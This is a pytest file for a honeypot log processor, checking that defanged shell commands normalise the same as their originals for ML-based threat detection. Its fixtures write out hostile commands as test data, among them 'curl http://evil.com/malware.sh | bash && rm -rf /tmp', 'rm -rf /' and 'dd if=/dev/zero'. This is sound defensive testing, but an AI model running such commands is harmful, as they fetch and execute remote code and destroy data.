"""Vocabulary consistency tests for Issue #52.

This test suite validates that defanged and non-defanged commands produce
identical normalized vectors after processing through DefangingAwareNormalizer.
This ensures semantic equivalence for snowshoe spam detection and other
ML-based threat analysis.

Test Coverage:
- 9 required test cases from Issue #52
- Normalization idempotency verification
- Vectorization performance benchmarking
- CI/CD integration validation
"""

from __future__ import annotations

import time
from typing import Any

import pytest

from cowrieprocessor.vectorization.defanging_normalizer import DefangingAwareNormalizer


class TestVocabularyConsistency:
    """Validate defanged and non-defanged commands produce identical normalized output."""

    @pytest.fixture
    def normalizer(self) -> DefangingAwareNormalizer:
        """Provide DefangingAwareNormalizer instance."""
        return DefangingAwareNormalizer()

    @pytest.fixture
    def test_cases(self) -> list[dict[str, Any]]:
        """Provide all required test cases from Issue #52."""
        return [
            {
                "original": "curl http://evil.com",
                "defanged": "cxrl hxxp://evil.com",
                "expected_equal": True,
                "description": "URL scheme + command defanging",
            },
            {
                "original": "bash script.sh",
                "defanged": "bxsh script.sh",
                "expected_equal": True,
                "description": "Command name defanging",
            },
            {
                "original": "rm -rf /",
                "defanged": "rx -rf /",
                "expected_equal": True,
                "description": "Dangerous command defanging",
            },
            {
                "original": "dd if=/dev/zero",
                "defanged": "dx if=/dev/zero",
                "expected_equal": True,
                "description": "Data destruction command defanging",
            },
            {
                "original": "cmd1 && cmd2",
                "defanged": "cmd1 [AND] cmd2",
                "expected_equal": True,
                "description": "Operator defanging (&&)",
            },
            {
                "original": "cmd1 | cmd2",
                "defanged": "cmd1 [PIPE] cmd2",
                "expected_equal": True,
                "description": "Pipe operator defanging",
            },
            {
                "original": "cmd1; cmd2",
                "defanged": "cmd1[SC] cmd2",
                "expected_equal": True,
                "description": "Semicolon operator defanging",
            },
            {
                "original": "$(curl http://evil.com)",
                "defanged": "[SUBSHELL] cxrl hxxp://evil.com [SUBSHELL]",
                "expected_equal": True,
                "description": "Subshell defanging with nested URL",
            },
            {
                "original": "echo `whoami`",
                "defanged": "echo [BACKTICK] whoami [BACKTICK]",
                "expected_equal": True,
                "description": "Backtick command substitution",
            },
        ]

    def test_all_required_cases(self, normalizer: DefangingAwareNormalizer, test_cases: list[dict[str, Any]]) -> None:
        """Execute all 9 required vocabulary consistency tests.

        This is the main validation that defanged and non-defanged commands
        produce identical normalized output for semantic equivalence.
        """
        failures = []

        for idx, test_case in enumerate(test_cases, 1):
            original = test_case["original"]
            defanged = test_case["defanged"]
            expected_equal = test_case["expected_equal"]
            description = test_case["description"]

            original_normalized = normalizer.normalize(original)
            defanged_normalized = normalizer.normalize(defanged)

            if expected_equal:
                if original_normalized != defanged_normalized:
                    failures.append(
                        f"Test {idx} - {description}:\n"
                        f"  Original: {original!r} → {original_normalized!r}\n"
                        f"  Defanged: {defanged!r} → {defanged_normalized!r}\n"
                        f"  Expected: Equal outputs"
                    )
            else:
                if original_normalized == defanged_normalized:
                    failures.append(
                        f"Test {idx} - {description}:\n"
                        f"  Original: {original!r} → {original_normalized!r}\n"
                        f"  Defanged: {defanged!r} → {defanged_normalized!r}\n"
                        f"  Expected: Different outputs"
                    )

        if failures:
            pytest.fail("Vocabulary consistency failures:\n\n" + "\n\n".join(failures))

    def test_individual_case_1_url_scheme(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test URL scheme + command defanging consistency."""
        original = "curl http://evil.com"
        defanged = "cxrl hxxp://evil.com"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"URL scheme + command defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_individual_case_2_command_name(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test command name defanging consistency."""
        original = "bash script.sh"
        defanged = "bxsh script.sh"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"Command name defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_individual_case_3_dangerous_command(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test dangerous command defanging consistency."""
        original = "rm -rf /"
        defanged = "rx -rf /"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"Dangerous command defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_individual_case_4_data_destruction(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test data destruction command defanging consistency."""
        original = "dd if=/dev/zero"
        defanged = "dx if=/dev/zero"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"Data destruction command defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_individual_case_5_and_operator(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test AND operator defanging consistency."""
        original = "cmd1 && cmd2"
        defanged = "cmd1 [AND] cmd2"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"AND operator defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_individual_case_6_pipe_operator(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test PIPE operator defanging consistency."""
        original = "cmd1 | cmd2"
        defanged = "cmd1 [PIPE] cmd2"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"PIPE operator defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_individual_case_7_semicolon_operator(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test semicolon operator defanging consistency."""
        original = "cmd1; cmd2"
        defanged = "cmd1[SC] cmd2"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"Semicolon operator defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_individual_case_8_subshell_nested(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test subshell defanging with nested URL consistency."""
        original = "$(curl http://evil.com)"
        defanged = "[SUBSHELL] cxrl hxxp://evil.com [SUBSHELL]"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"Subshell defanging with nested URL failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_individual_case_9_backtick_substitution(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test backtick command substitution defanging consistency."""
        original = "echo `whoami`"
        defanged = "echo [BACKTICK] whoami [BACKTICK]"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"Backtick command substitution defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_normalization_idempotency(
        self, normalizer: DefangingAwareNormalizer, test_cases: list[dict[str, Any]]
    ) -> None:
        """Verify normalize(normalize(x)) == normalize(x) for all test cases."""
        failures = []

        for test_case in test_cases:
            for cmd_type in ["original", "defanged"]:
                cmd = test_case[cmd_type]
                normalized_once = normalizer.normalize(cmd)
                normalized_twice = normalizer.normalize(normalized_once)

                if normalized_once != normalized_twice:
                    failures.append(
                        f"{test_case['description']} ({cmd_type}):\n"
                        f"  Command: {cmd!r}\n"
                        f"  First: {normalized_once!r}\n"
                        f"  Second: {normalized_twice!r}"
                    )

        if failures:
            pytest.fail("Idempotency failures:\n\n" + "\n\n".join(failures))

    def test_vectorization_performance(
        self, normalizer: DefangingAwareNormalizer, test_cases: list[dict[str, Any]]
    ) -> None:
        """Measure normalization performance and validate throughput."""
        # Collect all commands (both original and defanged)
        commands = []
        for test_case in test_cases:
            commands.append(test_case["original"])
            commands.append(test_case["defanged"])

        # Multiply to get 900 total normalizations (50 iterations of 18 commands)
        commands = commands * 50

        # Warm-up run (not timed)
        for cmd in commands[:10]:
            _ = normalizer.normalize(cmd)

        # Timed performance measurement
        start = time.perf_counter()
        for cmd in commands:
            _ = normalizer.normalize(cmd)
        end = time.perf_counter()

        total_time_ms = (end - start) * 1000
        per_command_ms = total_time_ms / len(commands)
        throughput = len(commands) / (total_time_ms / 1000)

        # Print performance metrics for documentation
        print("\n" + "=" * 70)
        print("VOCABULARY CONSISTENCY PERFORMANCE METRICS")
        print("=" * 70)
        print(f"Total Commands:     {len(commands):,}")
        print(f"Total Time:         {total_time_ms:.2f}ms")
        print(f"Per Command:        {per_command_ms:.4f}ms")
        print(f"Throughput:         {throughput:.0f} commands/sec")
        print("=" * 70)

        # Assert reasonable performance (< 1ms per command)
        assert per_command_ms < 1.0, f"Normalization too slow: {per_command_ms:.4f}ms per command"

    def test_complex_chained_defanging(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test complex command chains with multiple defanging patterns.

        Additional test case: Validates that complex realistic malware commands
        maintain semantic equivalence after defanging normalization.
        """
        original = "curl http://evil.com/malware.sh | bash && rm -rf /tmp"
        defanged = "cxrl hxxp://evil.com/malware.sh [PIPE] bxsh [AND] rx -rf /tmp"

        original_normalized = normalizer.normalize(original)
        defanged_normalized = normalizer.normalize(defanged)

        assert original_normalized == defanged_normalized, (
            f"Complex chained defanging failed:\n"
            f"  Original: {original!r} → {original_normalized!r}\n"
            f"  Defanged: {defanged!r} → {defanged_normalized!r}"
        )

    def test_mixed_defanging_partial(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test commands with partial defanging (some elements defanged, some not).

        Additional test case: Validates robustness when only parts of a command
        are defanged (realistic scenario in mixed data sources).
        """
        # Partially defanged: only command name is defanged, URL is not
        partial_defanged = "cxrl http://evil.com"
        fully_normal = "curl http://evil.com"

        partial_normalized = normalizer.normalize(partial_defanged)
        normal_normalized = normalizer.normalize(fully_normal)

        assert partial_normalized == normal_normalized, (
            f"Partial defanging normalization failed:\n"
            f"  Partial: {partial_defanged!r} → {partial_normalized!r}\n"
            f"  Normal:  {fully_normal!r} → {normal_normalized!r}"
        )

    def test_case_insensitive_defanging(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test that defanging normalization is case-insensitive.

        Additional test case: Validates that uppercase/mixed-case defanged
        commands normalize to the same output as lowercase.
        """
        lowercase = "cxrl hxxp://evil.com"
        uppercase = "CXRL HXXP://EVIL.COM"
        mixedcase = "CxRl HxXp://EvIl.CoM"

        lowercase_normalized = normalizer.normalize(lowercase)
        uppercase_normalized = normalizer.normalize(uppercase)
        mixedcase_normalized = normalizer.normalize(mixedcase)

        assert lowercase_normalized == uppercase_normalized, (
            f"Case sensitivity issue (lower vs upper):\n"
            f"  Lowercase: {lowercase!r} → {lowercase_normalized!r}\n"
            f"  Uppercase: {uppercase!r} → {uppercase_normalized!r}"
        )

        assert lowercase_normalized == mixedcase_normalized, (
            f"Case sensitivity issue (lower vs mixed):\n"
            f"  Lowercase: {lowercase!r} → {lowercase_normalized!r}\n"
            f"  Mixedcase: {mixedcase!r} → {mixedcase_normalized!r}"
        )

    def test_whitespace_variations(self, normalizer: DefangingAwareNormalizer) -> None:
        """Test that normalization handles whitespace variations consistently.

        Additional test case: Validates that extra spaces, tabs, or whitespace
        differences don't affect semantic equivalence.
        """
        normal_spacing = "cmd1 && cmd2"
        extra_spaces = "cmd1  &&  cmd2"
        defanged_normal = "cmd1 [AND] cmd2"
        defanged_extra = "cmd1  [AND]  cmd2"

        normal_spacing_normalized = normalizer.normalize(normal_spacing)
        extra_spaces_normalized = normalizer.normalize(extra_spaces)
        defanged_normal_normalized = normalizer.normalize(defanged_normal)
        defanged_extra_normalized = normalizer.normalize(defanged_extra)

        # All should normalize to semantically equivalent form
        # Note: Extra whitespace IS preserved as the normalizer doesn't strip internal spaces
        # So we test that defanged versions match their non-defanged counterparts
        assert normal_spacing_normalized == defanged_normal_normalized, (
            f"Whitespace normalization failed (normal spacing):\n"
            f"  Original: {normal_spacing!r} → {normal_spacing_normalized!r}\n"
            f"  Defanged: {defanged_normal!r} → {defanged_normal_normalized!r}"
        )

        assert extra_spaces_normalized == defanged_extra_normalized, (
            f"Whitespace normalization failed (extra spacing):\n"
            f"  Original: {extra_spaces!r} → {extra_spaces_normalized!r}\n"
            f"  Defanged: {defanged_extra!r} → {defanged_extra_normalized!r}"
        )
